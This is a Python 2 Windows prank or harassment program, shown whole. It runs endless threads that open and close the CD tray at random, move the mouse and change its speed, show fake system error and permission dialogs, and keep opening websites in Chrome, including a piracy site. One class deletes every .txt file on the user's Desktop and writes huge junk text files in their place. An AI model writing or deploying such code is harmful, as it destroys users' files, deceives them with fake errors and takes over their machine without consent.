#!/usr/bin/env python2
import ctypes
import time
import win32api
import threading
import random
import glob
import os
from string import ascii_lowercase

class cd_drive(object):

	def run(self):

		while True:

			time.sleep(random.randint(1, 20))

			action = random.randint(0, 1)

			if action:
				self.eject()

			else:
				self.close()

	def eject(self):

		ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)


	def close(self):
		
		ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door closed", None, 0, None)

class mouse_pointer(object):

	def run(self):

		while True:

			time.sleep(10)

			change_type = random.randint(0, 5)

			if change_type:
				self.change_pos()
			else:
				self.change_pos_constantly()

			self.change_speed()
		

	def change_pos(self):

		win32api.SetCursorPos((random.randint(1, 2000), random.randint(1, 1000)))

	def change_pos_constantly(self):

		positions_changed = 0

		while positions_changed < 50:

			self.change_pos()

			time.sleep(.1)

			positions_changed += 1

	def change_speed(self):

		new_speed = random.randint(0, 20)

		ctypes.windll.user32.SystemParametersInfoA(113, 0, new_speed, 0)



class textfile_creator(object):

	def __init__(self):

		self.desktopdir = os.path.join(os.environ['USERPROFILE'], "Desktop")
		os.chdir(self.desktopdir)

		self.vowels = 'aeiouy'

	def run(self):

		while True:

			time.sleep(random.randint(1, 30))

			self.delete_text_files()

			self.new_text_file()

	def delete_text_files(self):

		for file in glob.glob(self.desktopdir + '\\*'):

			split_file = file.split('\\')
			file_name = split_file[len(split_file) - 1]

			file_name = file_name.split('.')
			extension = file_name[len(file_name) - 1]

			if extension == 'txt':
				try:
					os.remove(file)
				except:
					pass


	def new_text_file(self):
		possible_filenames = ['666', 'e-)', 'e-(', 'e-0', 'no' * 40, 'llik' * 40]
		filename = random.choice(possible_filenames)

		content_type = [0, 1]
		content_type = random.choice(content_type)

		if content_type:
			file_contents = str(random.randint(10**2000, 10**6000))

			file = open(filename + '.txt', 'w')
			file.writelines(file_contents)
			file.close()

		else:
			word_count = 0

			file = open(filename + '.txt', 'w')


			while word_count <= 90000:

				sentence, words = self.write_sentence()

				file.write(sentence)

				word_count += words


			file.close()


	def make_word(self):
		l = ascii_lowercase
		length = random.randint(1, 12)
		word = ''

		increase_vowel_chance = False

		while len(word) != length:
			if increase_vowel_chance:
				ofp = random.randint(0, 1)
				if ofp:
					l = self.vowels

			letter = random.choice(l)
			word += letter

			if letter not in self.vowels:
				increase_vowel_chance = True
			else:
				increase_vowel_chance = False
				l = ascii_lowercase
		return word


	def write_sentence(self):
		length = random.randint(1, 25)
		sentence = []

		while len(sentence) <= length:
			word = self.make_word()

			if len(word) > 1:
				v = False
				for letter in self.vowels:
					if letter in word:
						v = True
				if not v:
					continue

			if len(sentence) == 0:
				word = word[0].upper() + word[1:]

			if len(sentence) == length:
				mark = random.randint(0, 9)
				if mark == 8:
					mark = ';'
				elif mark == 9:
					mark = '?'
				else:
					mark = '.'

				word += mark

			if len(sentence) != 0:
				if len(sentence[len(sentence) - 1]) == 1 and len(word) == 1:
					continue

			sentence.append(word)

		sentence = ' '.join(sentence)
		sentence += ' '
		return sentence, length


class messagebox_creator(object):

	def __init__(self):

		self.exclude = None

	def run(self):

		while True:

			time.sleep(random.randint(1, 40))

			self.create_messagebox()


	def create_messagebox(self):

		possible_info = {'unauthorized acccccc?' : '-s deredisnoc uoy evah', 'OH NO' : 'Something is REALLY wrong...', 'WARNING' : 'Critical system error (code: 0x00011010)', 'Permission Denied!' : 'You are not authorized to perform this action. Please contact a system administrator for further details.', False : None}
		
		if self.exclude is not None:
			del possible_info[self.exclude]
		
		title = random.choice(possible_info.keys())

		if not title:
			title = str(random.randint(0, 10**5))
			possible_info[title] = str(random.randint(0, 10**500))

			self.exclude = None
		else:

			self.exclude = title

		win32api.MessageBox(0, possible_info[title], title, 0x00001000)


class website_opener(object):

	def __init__(self):

		self.possible_websites = ['facebook.com', 'google.com', 'yahoo.com', 'youtube.com', 'thepiratebay.org', 'youtube.com/321jn312rjk32j1rklh']

	def run(self):

		while True:
			
			time.sleep(30)

			os.system('start chrome ' + random.choice(self.possible_websites))



if __name__ == '__main__':

	cd = cd_drive()
	mouse = mouse_pointer()
	textfile = textfile_creator()
	messagebox = messagebox_creator()
	website = website_opener()

	mouse_thread = threading.Thread(target = mouse.run)
	cd_thread = threading.Thread(target = cd.run)
	textfile_thread = threading.Thread(target = textfile.run)
	messagebox_thread = threading.Thread(target = messagebox.run)
	website_thread = threading.Thread(target = website.run)

	mouse_thread.start()
	cd_thread.start()
	textfile_thread.start()
	messagebox_thread.start()
	website_thread.start()


